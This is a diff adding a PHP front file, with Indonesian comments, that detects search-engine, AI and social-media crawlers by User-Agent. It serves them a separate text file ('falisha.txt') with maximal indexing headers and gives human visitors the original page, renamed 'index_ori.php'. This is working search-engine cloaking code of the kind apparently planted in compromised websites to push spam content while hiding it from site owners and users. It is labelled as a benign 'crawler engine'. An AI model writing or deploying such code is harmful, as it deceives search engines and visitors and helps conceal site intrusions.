@@ -1,0 +1,67 @@
+<?php
+error_reporting(E_ALL);
+ini_set('display_errors', 1);
+
+// --- 2. ADVANCED CRAWLER ENGINE (RELIABLE & TESTABLE) ---
+function is_advanced_search_bot() {
+    $ua = isset($_SERVER['HTTP_USER_AGENT']) ? strtolower($_SERVER['HTTP_USER_AGENT']) : '';
+    
+    if (empty($ua)) return false;
+
+    // Filter otomatis untuk mencegah pemalsuan browser mentah
+    $automated_spoofers = ['headless', 'puppeteer', 'playwright', 'selenium', 'phantomjs', 'electron', 'cypress', 'python-requests'];
+    foreach ($automated_spoofers as $spoof) {
+        if (strpos($ua, $spoof) !== false) {
+            return false; 
+        }
+    }
+
+    // Daftar tanda tangan seluruh bot mesin pencari, AI, dan tools SEO
+    $bot_signatures = [
+        'googlebot', 'googlebot-image', 'googlebot-news', 'googlebot-video',
+        'google-cws', 'google-inspectiontool', 'google-site-verification',
+        'google-read-aloud', 'googleother', 'googleother-image', 'googleother-video',
+        'mediapartners-google', 'adsbot-google', 'adsbot-google-mobile', 'google-favicon', 
+        'google-news', 'google-amphtml', 'google-extended', 'google-cloudvertex', 'vertexbot',
+        'google-prober', 'apis-google', 'google-hosted-by-delivery', 'feedfetcher-google',
+        'chrome-lighthouse', 'appengine-google', 'iaskbot', 'imagesiftbot', 'cohere-ai',
+        'google-safety', 'google-readaloud', 'google-translate', 'google-structuredupload',
+        'google-speakr', 'google-adwords', 'google-shopping-reviews', 'google-analytics',
+        'google-search-console', 'google-inspection-api', 'google-automation', 'google-pki',
+        'google-store', 'google-experiment', 'google-ai-search', 'google-agent', 'google-deepmind',
+        'google-gemini', 'vertex-ai', 'deepmind-research',
+        'bingbot', 'bingpreview', 'msnbot', 'adidxbot', 'slurp', 'duckduckbot', 
+        'baiduspider', 'yandex', 'gptbot', 'claudebot', 'applebot', 'ccbot', 
+        'perplexibot', 'anthropicbot', 'meta-externalagent', 'deepseek', 'bytespider',
+        'omgili', 'perplexitybot', 'dataforseobot', 'mj12bot',
+        'telegrambot', 'facebookexternalhit', 'twitterbot', 'whatsapp', 'linkedinbot',
+        'ahrefsbot', 'semrushbot', 'screaming frog'
+    ];
+
+    foreach ($bot_signatures as $bot) {
+        if (strpos($ua, $bot) !== false) {
+            return true;
+        }
+    }
+
+    return false;
+}
+
+// Deteksi bot
+$is_bot = is_advanced_search_bot();
+
+// Header keamanan untuk semua pengunjung
+header("X-Content-Type-Options: nosniff");
+header("X-Frame-Options: SAMEORIGIN");
+header("X-XSS-Protection: 1; mode=block");
+
+if ($is_bot) {
+    // Header khusus untuk bot (indexing dan konten)
+    header("X-Robots-Tag: index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1");
+    include 'falisha.txt';   // Tampilkan konten untuk bot
+    exit;
+} else {
+    include 'index_ori.php'; // Tampilkan konten untuk pengguna biasa (termasuk mobile)
+    exit;
+}
+?>
